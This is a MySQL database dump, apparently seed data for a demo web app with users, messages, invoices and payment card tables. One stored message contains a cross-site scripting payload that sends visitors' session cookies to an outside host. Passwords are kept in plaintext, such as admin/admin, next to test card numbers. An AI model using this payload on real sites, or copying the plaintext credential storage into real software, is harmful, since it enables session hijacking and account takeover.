-- Adminer 4.6.1 MySQL dump

SET NAMES utf8;
SET time_zone = '+00:00';
SET foreign_key_checks = 0;
SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO';

DROP TABLE IF EXISTS `invoices`;
CREATE TABLE `invoices` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user` varchar(128) DEFAULT NULL,
  `amount_cents` int(11) DEFAULT NULL,
  `product` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `invoices` (`id`, `user`, `amount_cents`, `product`) VALUES
(1,	'1',	2,	'test');

DROP TABLE IF EXISTS `messages`;
CREATE TABLE `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `subject` varchar(255) DEFAULT NULL,
  `message` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `messages` (`id`, `user_id`, `subject`, `message`) VALUES
(1,	1,	'Hello There',	'Hey Jared, Really loved your talk.\r\n\r\n<script>\r\nnew Image().src=\"http://arandomwebsitethatisbadandstuff.com/?c=\"+encodeURI(document.cookie);\r\n</script>'),
(2,	1,	'hi',	'how are Jared'),
(3,	2,	'hi allan',	'Hope you are fine allan!');

DROP TABLE IF EXISTS `payment_details`;
CREATE TABLE `payment_details` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `card_number` varchar(16) DEFAULT NULL,
  `ccv` int(11) DEFAULT NULL,
  `name` varchar(255) DEFAULT NULL,
  `expire_month` int(11) DEFAULT NULL,
  `expire_year` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `payment_details` (`id`, `user_id`, `card_number`, `ccv`, `name`, `expire_month`, `expire_year`) VALUES
(1,	1,	'4564123412341234',	123,	'Jared Mooring',	5,	2011),
(2,	2,	'4564123412341234',	123,	'Allan Shone',	5,	2011);

DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) DEFAULT NULL,
  `password` varchar(20) DEFAULT NULL,
  `firstname` varchar(20) DEFAULT NULL,
  `surname` varchar(20) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `role` enum('user','admin') DEFAULT 'user',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `users` (`id`, `username`, `password`, `firstname`, `surname`, `email`, `role`) VALUES
(1,	'jared',	'jared',	'Jared',	'Mooring',	'jared@test.com',	'user'),
(2,	'allan',	'allan',	'Allan1',	'Shone1',	'allan@test.com',	'user'),
(3,	'admin',	'admin',	'rk',	'sarma',	'radhakrishna@srijancapital.com',	'admin');

-- 2018-10-09 12:05:31
